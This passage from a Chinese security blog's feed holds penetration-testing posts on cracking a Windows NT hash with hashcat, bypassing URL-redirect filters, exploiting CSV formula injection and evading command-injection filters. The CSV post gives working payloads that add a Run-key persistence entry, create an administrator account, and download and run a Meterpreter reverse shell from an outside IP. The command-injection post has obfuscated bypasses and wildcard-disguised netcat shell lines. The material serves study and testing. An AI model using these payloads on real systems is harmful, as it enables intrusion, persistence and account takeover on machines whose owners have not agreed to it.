href="http://uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/">http://uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</a></p><p>提取到windows hash如下</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">test:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:f9e37e83b83c47a93c2f09f66408631b</span>::<span class="hljs-symbol">:</span><br><br>用户名称<span class="hljs-symbol">:RID</span><span class="hljs-symbol">:LM-HASH</span>值<span class="hljs-symbol">:NT-HASH</span>值<br></code></pre></td></tr></table></figure><p>我们需要提取后方的NT-HASH用来破解，即f9e37e83b83c47a93c2f09f66408631b存入test.txt，由于我设置的是三位字母三位数字的密码，使用如下掩码进行爆破</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">1000</span> -a <span class="hljs-number">3</span> -o result<span class="hljs-number">4</span>.txt test.txt ?l?l?l?d?d?d --force<br></code></pre></td></tr></table></figure><p>可以很快得到结果</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/hashcat/hashcat01.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></li><li><a href="https://www.freebuf.com/sectool/164507.html">https://www.freebuf.com/sectool/164507.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>url重定向漏洞绕过方式总结</title>
    <link href="/2020/07/27/url%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2020/07/27/url%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="url重定向漏洞"><a href="#url重定向漏洞" class="headerlink" title="url重定向漏洞"></a>url重定向漏洞</h2><p>URL重定向（URL redirection，或称网址重定向或网域名称转址），是指当使用者浏览某个网址时，将他导向到另一个网址的技术。而url重定向漏洞产生的原因是这个网址可控且没有做足够的校验，导致网站接受恶意用户输入的链接，跳转到一个攻击者控制的网站，而攻击者控制的网站往往是一个钓鱼页面，用于骗取用户的个人信息和登录口令。 </p><h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><p>存在漏洞的url往往都具有以下格式：</p><p><a href="http://www.example.com/xxx?server=http://www.example.com/yyy">http://www.example.com/xxx?server=http://www.example.com/yyy</a></p><p>后面的url就是其跳转的url，一般由于regist、login、logout这些位置在操作完之后都会有跳转操作，url跳转漏洞也多出现于这类位置。</p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="检测是否存在信任域名绕过"><a href="#检测是否存在信任域名绕过" class="headerlink" title="检测是否存在信任域名绕过"></a>检测是否存在信任域名绕过</h3><p>由于过滤机制往往只检查后面url是否包含信任域名，所以可构造如下url进行绕过：</p><p><a href="http://www.example.com/xxx?server=http://www.example.com.hack.com/hack.html">http://www.example.com/xxx?server=http://www.example.com.hack.com/hack.html</a></p><p>hack.com是攻击者网站，攻击者在hack.com中构造<a href="http://www.example.com.hack.com的解析且http//hack.com/hack.html">www.example.com.hack.com的解析且http://hack.com/hack.html</a> 页面为攻击页面即可。</p><p><a href="http://www.example.com/xxx?server=http://hack.com/www.example.com/">http://www.example.com/xxx?server=http://hack.com/www.example.com/</a></p><p>hack.com是攻击者网站，攻击者在hack.com中构造<a href="http://hack.com/www.example.com/">http://hack.com/www.example.com/</a> 页面为攻击页面即可。</p><h3 id="多次重定向绕过"><a href="#多次重定向绕过" class="headerlink" title="多次重定向绕过"></a>多次重定向绕过</h3><p>某些过滤机制可以允许跳转某些信任站点如 baidu.com，如果存在这种情况，可以使用多重跳转来规避过滤机制。</p><p><a href="http://www.example.com/xxx?server=https://www.baidu.com/link?url=fIqZTSHDWy6_CvKi0jDIAa8ZKUKwrwhQlmYecokJ9gy">http://www.example.com/xxx?server=https://www.baidu.com/link?url=fIqZTSHDWy6_CvKi0jDIAa8ZKUKwrwhQlmYecokJ9gy</a></p><p>link?url= 是百度的默认跳转方式，后面是百度的缓存链接，上面链接的缓存是google页面，此url可通过百度二次跳转到谷歌。</p><h3 id="特殊符号绕过"><a href="#特殊符号绕过" class="headerlink" title="特殊符号绕过"></a>特殊符号绕过</h3><p>以下例子中，<a href="http://www.example.com为可信网站,www.hack.com为恶意网站/">www.example.com为可信网站，www.hack.com为恶意网站</a></p><p>@绕过</p><p><a href="http://www.example.com/xxx?server=http://www.example.com@www.hack.com">http://www.example.com/xxx?server=http://www.example.com@www.hack.com</a></p><p>/绕过</p><p><a href="http://www.example.com/xxx?server=/www.hack.com">http://www.example.com/xxx?server=/www.hack.com</a></p><p>//绕过</p><p><a href="http://www.example.com/xxx?server=//www.hack.com">http://www.example.com/xxx?server=//www.hack.com</a></p><p>////绕过</p><p><a href="http://www.example.com/xxx?server=////www.hack.com">http://www.example.com/xxx?server=////www.hack.com</a></p><p>\绕过</p><p><a href="http://www.example.com/xxx?server=http://www.hack.com%5Cwww.example.com">http://www.example.com/xxx?server=http://www.hack.com\www.example.com</a></p><p>#绕过</p><p><a href="http://www.example.com/xxx?server=http://www.hack.com#www.example.com">http://www.example.com/xxx?server=http://www.hack.com#www.example.com</a></p><p>?绕过</p><p><a href="http://www.example.com/xxx?server=http://www.hack.com?www.example.com">http://www.example.com/xxx?server=http://www.hack.com?www.example.com</a></p><p>.绕过</p><p><a href="http://www.example.com/xxx?server=.hack.com">http://www.example.com/xxx?server=.hack.com</a></p><h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><p>跳转地址白名单化</p><p>如无法使用白名单，要合理校验跳转地址，限制绕过手段</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csv注入利用和绕过总结</title>
    <link href="/2020/07/16/csv%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <url>/2020/07/16/csv%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="csv注入"><a href="#csv注入" class="headerlink" title="csv注入"></a>csv注入</h2><p>csv注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开csv文件时，文件会转换为excel格式并提供excel公式的执行功能，会造成命令执行问题。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞原理就是excel的一个特性，当单元格中内容以=-+@等符号开头时，excel将会将其当成一个公式处理。</p><p>所以当我们输入=1+1时，excel会自动将其计算</p><p>那么利用这个办法，把等号后面的内容改为执行cmd命令控制其打开一个计算器</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">=<span class="hljs-number">1</span>+cmd|&#x27; /C calc&#x27;!<span class="hljs-symbol">A0</span><br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">=cmd|&#x27;/C reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v calc /<span class="hljs-built_in">t</span> REG_SZ /d <span class="hljs-symbol">c:</span>\windows\system32\calc.exe /f&#x27;!<span class="hljs-symbol">A0</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/csv_inject/csv01.png"></p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">=cmd|&#x27;/C net user test <span class="hljs-number">123456</span> /add&#x27;!<span class="hljs-symbol">A0</span>+<br><br></code></pre></td></tr></table></figure><p>可以使用命令注入中的知识，同时执行两个命令，达到新建一个管理员用户的效果</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">=cmd|&#x27;/C net user test <span class="hljs-number">123456</span> /add &amp;&amp; net localgroup administrators test /add&#x27;!<span class="hljs-symbol">A0</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/csv_inject/csv02.png"></p><h3 id="下载木马，反弹shell"><a href="#下载木马，反弹shell" class="headerlink" title="下载木马，反弹shell"></a>下载木马，反弹shell</h3><p>准备木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#msf生成payload</span><br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=xxx.xxx.xxx.xxx <span class="hljs-attribute">LPORT</span>=4444 -f exe -o reverse_tcp.exe<br><span class="hljs-comment">#python2开启http服务</span><br>python -m SimpleHTTPServer 8888<br><span class="hljs-comment">#python3开启http服务</span><br>python -m http.server 8888<br></code></pre></td></tr></table></figure><p>攻击机监听</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">msfconsole<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST xxx.xxx.xxx.xxx</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span><br>run<br></code></pre></td></tr></table></figure><p>靶机从python http服务下载木马并执行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">curl http://<span class="hljs-number">170.170</span>.<span class="hljs-number">64.17</span>:<span class="hljs-number">8888</span>/reverse_tcp.<span class="hljs-keyword">exe</span> --output windowsLocal.<span class="hljs-keyword">exe</span> &amp;&amp; .\windowsLocal.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p>那么我们在csv注入场景下的payload就是</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">=cmd|&#x27;/C curl ht<span class="hljs-symbol">tp:</span>//<span class="hljs-number">170.170</span>.<span class="hljs-number">64.17</span><span class="hljs-symbol">:8888</span>/reverse_tcp.exe --output windowsLocal.exe &amp;&amp; .\windowsLocal.exe&#x27;!<span class="hljs-symbol">A0</span><br></code></pre></td></tr></table></figure><p>不过这个方法一般会在下载步骤被windows防火墙拦截，可以自行增加一层编解码或者加解密过程。</p><p>反弹shell也可以通过调用powershell下载powercat反弹，使用nc监听。</p><h2 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h2><h3 id="其他运算符号绕过"><a href="#其他运算符号绕过" class="headerlink" title="其他运算符号绕过"></a>其他运算符号绕过</h3><p>很多场景下服务器会过滤=，但是在excel中，+，-，@等也可以触发公式</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">-<span class="hljs-keyword">cmd</span><span class="bash">|<span class="hljs-string">&#x27; /C calc&#x27;</span>!A0</span><br>+<span class="hljs-keyword">cmd</span><span class="bash">|<span class="hljs-string">&#x27; /C calc&#x27;</span>!A0</span><br>@SUM(<span class="hljs-keyword">cmd</span><span class="bash">|<span class="hljs-string">&#x27;/c calc&#x27;</span>!A0)</span><br></code></pre></td></tr></table></figure><h3 id="0A绕过自动添加单引号"><a href="#0A绕过自动添加单引号" class="headerlink" title="%0A绕过自动添加单引号"></a>%0A绕过自动添加单引号</h3><p>有些防御手法会在等号之类的运算符前增加’，或每个元素开头直接添加单引号，可使用%0A换行执行</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">%<span class="hljs-number">0</span>A-<span class="hljs-number">1</span>+<span class="hljs-keyword">cmd</span><span class="bash">|<span class="hljs-string">&#x27; /C calc&#x27;</span>!A0</span><br></code></pre></td></tr></table></figure><h3 id="绕过自动添加单引号"><a href="#绕过自动添加单引号" class="headerlink" title=";绕过自动添加单引号"></a>;绕过自动添加单引号</h3><p>有些防御手法会在等号之类的运算符前增加’，或每个元素开头直接添加单引号，可使用;分割，分别执行</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">;-<span class="hljs-number">1</span>+<span class="hljs-keyword">cmd</span><span class="bash">|<span class="hljs-string">&#x27; /C calc&#x27;</span>!A0</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令注入绕过方式总结</title>
    <link href="/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>命令注入是web中常见的漏洞之一，由于web应用程序未对用户提交的数据做严格的过滤，导致用户输入可以直接被linux或windows系统当成命令执行，一般都会造成严重的危害。</p><h2 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h2><h4 id="分号（-）"><a href="#分号（-）" class="headerlink" title="分号（;）"></a>分号（;）</h4><p>多条语句顺序执行时的分割符号。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">cmd1<span class="hljs-comment">;cmd2</span><br></code></pre></td></tr></table></figure><h4 id="管道符（-）"><a href="#管道符（-）" class="headerlink" title="管道符（|）"></a>管道符（|）</h4><p>cmd1命令的输出，作为下一条命令cmd2的参数。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1<span class="hljs-string">|cmd2</span><br></code></pre></td></tr></table></figure><h4 id="and（-amp-amp-）"><a href="#and（-amp-amp-）" class="headerlink" title="and（&amp;&amp;）"></a>and（&amp;&amp;）</h4><p>与命令，cmd1成功则执行cmd2，cmd1失败则不执行cmd2</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-meta">&amp;&amp; cmd2</span><br></code></pre></td></tr></table></figure><h4 id="or（-）"><a href="#or（-）" class="headerlink" title="or（||）"></a>or（||）</h4><p>或命令，cmd1失败则执行cmd2，cmd1成功则不执行cmd2</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">|| cmd2</span><br></code></pre></td></tr></table></figure><h4 id="反引号（-）和"><a href="#反引号（-）和" class="headerlink" title="反引号（``）和$()"></a>反引号（``）和$()</h4><p>反引号和$()都可用来表示命令，被这两种方式包含的字符串都会被当做命令首先执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;result : `whoami`&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;result : <span class="hljs-subst">$(whoami)</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="绕过方式总结"><a href="#绕过方式总结" class="headerlink" title="绕过方式总结"></a>绕过方式总结</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>在过滤了空格的系统中，以cat flag.txt为例，系统不允许我们输入空格或输入后被过滤。</p><h4 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h4><p>可使用${IFS}代替空格。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1flag</span>.txt<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;<span class="hljs-variable">$1flag</span>.txt<br></code></pre></td></tr></table></figure><h4 id="重定向符绕过-lt-gt"><a href="#重定向符绕过-lt-gt" class="headerlink" title="重定向符绕过(&lt;&gt;)"></a>重定向符绕过(&lt;&gt;)</h4><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span>&lt;&gt;flag.txt<br><span class="hljs-built_in">cat</span>&lt;flag.txt<br></code></pre></td></tr></table></figure><h4 id="09-需要php环境"><a href="#09-需要php环境" class="headerlink" title="%09(需要php环境)"></a>%09(需要php环境)</h4><p>php环境下web输入%09等效于空格</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span><span class="hljs-comment">%09flag.txt</span><br></code></pre></td></tr></table></figure><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><p>使用shell变量拼接被黑名单限制的关键词</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">a=c;b=at;c=<span class="hljs-built_in">fl</span>;d=ag;e=.txt;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span> <span class="hljs-variable">$c</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>;<br></code></pre></td></tr></table></figure><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>使用反引号包含base64解码后的命令</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">`echo <span class="hljs-string">&quot;Y2F0IGZsYWcudHh0Cg==&quot;</span> <span class="hljs-string">| base64 -d`</span><br></code></pre></td></tr></table></figure><p>将base64解码后的命令通过管道符传递给bash</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">echo <span class="hljs-string">&quot;Y2F0IGZsYWcudHh0Cg==&quot;</span> | <span class="hljs-type">base64</span> -d | <span class="hljs-type">bash</span><br></code></pre></td></tr></table></figure><h4 id="单引号，双引号"><a href="#单引号，双引号" class="headerlink" title="单引号，双引号"></a>单引号，双引号</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">c<span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">at</span> fl&#x27;<span class="hljs-symbol">&#x27;ag.tx</span><span class="hljs-string">&quot;&quot;</span>t<br></code></pre></td></tr></table></figure><h4 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠"></a>反斜杠</h4><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">c<span class="hljs-symbol">\a</span>t fl<span class="hljs-symbol">\a</span><span class="hljs-symbol">\g</span>.tx<span class="hljs-symbol">\t</span><br></code></pre></td></tr></table></figure><h4 id="1"><a href="#1" class="headerlink" title="$1"></a>$1</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">ca</span><span class="hljs-variable">$1t</span> <span class="hljs-keyword">fl</span><span class="hljs-variable">$1ag</span>.t<span class="hljs-variable">$1xt</span><br></code></pre></td></tr></table></figure><h3 id="读文件绕过"><a href="#读文件绕过" class="headerlink" title="读文件绕过"></a>读文件绕过</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">(1)more:一页一页的显示档案内容</span><br><span class="hljs-section">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="hljs-section">(3)head:查看头几行</span><br><span class="hljs-section">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="hljs-section">(5)tail:查看尾几行</span><br>(6)nl：显示的时候，顺便输出行号<br><span class="hljs-section">(7)od:以二进制的方式读取档案内容</span><br><span class="hljs-section">(8)vi:一种编辑器，这个也可以查看</span><br><span class="hljs-section">(9)vim:一种编辑器，这个也可以查看</span><br><span class="hljs-section">(10)sort:可以查看</span><br><span class="hljs-section">(11)uniq:可以查看</span><br>(12)file -f:报错出具体内容<br></code></pre></td></tr></table></figure><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>/???会去寻找 / 目录下的三个字符长度的文件，正常情况下会寻找到/bin，然后/?[a][t]会优先匹配到/bin/cat,就成功调用了cat命令，然后后面可以使用正常的通配符匹配所需读的文件，如flag.txt文件名长度为8，使用8个?’’，此命令就会读取所有长度为8的文件。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">?[</span>a][t] <span class="hljs-string">?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>同理，我们也可以匹配/bin下的其他命令，如more，less，vi，tail等命令来查看文件，或者执行其他命令。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">??</span><span class="hljs-string">?/</span>[m][o]<span class="hljs-string">?[</span>e] <span class="hljs-string">?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">??</span><span class="hljs-string">?/</span>[t]<span class="hljs-string">?[</span>i][l] <span class="hljs-string">?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>甚至开启一个shell</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">??</span><span class="hljs-string">?/</span>[n]<span class="hljs-string">?[</span>t]<span class="hljs-string">??</span>[t] -lvp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">??</span><span class="hljs-string">?/</span>[n]<span class="hljs-string">?[</span>t]<span class="hljs-string">??</span>[t] <span class="hljs-number">192.168</span>.<span class="hljs-number">1.3</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><h3 id="命令嵌套"><a href="#命令嵌套" class="headerlink" title="命令嵌套"></a>命令嵌套</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">echo <span class="hljs-string">&quot;result:`whoami`&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;result:<span class="hljs-subst">$(uname -a)</span>&quot;</span><br></code></pre></td></tr></table></figure><h3 id="长度绕过"><a href="#长度绕过" class="headerlink" title="长度绕过"></a>长度绕过</h3><h4 id="使用-gt-gt-绕过长度限制"><a href="#使用-gt-gt-绕过长度限制" class="headerlink" title="使用&gt;&gt;绕过长度限制"></a>使用&gt;&gt;绕过长度限制</h4><p>使用&gt;&gt;每次添加一部分命令到文件中</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">echo -n <span class="hljs-string">&quot;cmd1&quot;</span> &gt; r<span class="hljs-comment">;</span><br>echo -n <span class="hljs-string">&quot;cmd2&quot;</span> &gt;&gt; r<span class="hljs-comment">;</span><br>echo -n <span class="hljs-string">&quot;cmd3&quot;</span> &gt;&gt; r<span class="hljs-comment">;</span><br>echo <span class="hljs-string">&quot;cmd4&quot;</span> &gt;&gt; r<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>然后使用cat r | bash执行命令 </p><h4 id="使用换行执行和ls-t绕过长度限制"><a href="#使用换行执行和ls-t绕过长度限制" class="headerlink" title="使用换行执行和ls -t绕过长度限制"></a>使用换行执行和ls -t绕过长度限制</h4><p>linux中，文件中的命令如果需要换行书写，需要在前一行末尾增加\，如文件a中有</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ca<span class="hljs-string">\</span><br>t flag.t<span class="hljs-string">\</span><br>xt<br></code></pre></td></tr></table></figure><p>使用sh a即可执行命令cat flag.txt</p><p>ls -t可根据时间创建顺序逆序输出文件名</p><blockquote><p>a可以创建一个名为a的文件</p></blockquote><p>按照这个思路，可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">&gt; &quot;ag&quot;<br>&gt; &quot;fl\\&quot;<br>&gt; &quot;t \\&quot;<br>&gt; &quot;ca\\&quot;<br></code></pre></td></tr></table></figure><p>然后使用ls -t &gt; s</p><p>s中文件内容就是</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">s<br>ca<span class="hljs-string">\</span><br>t <span class="hljs-string">\</span><br>fl<span class="hljs-string">\</span><br>ag<span class="hljs-string">\</span><br>其他的无关内容<br></code></pre></td></tr></table></figure><p>之后使用sh 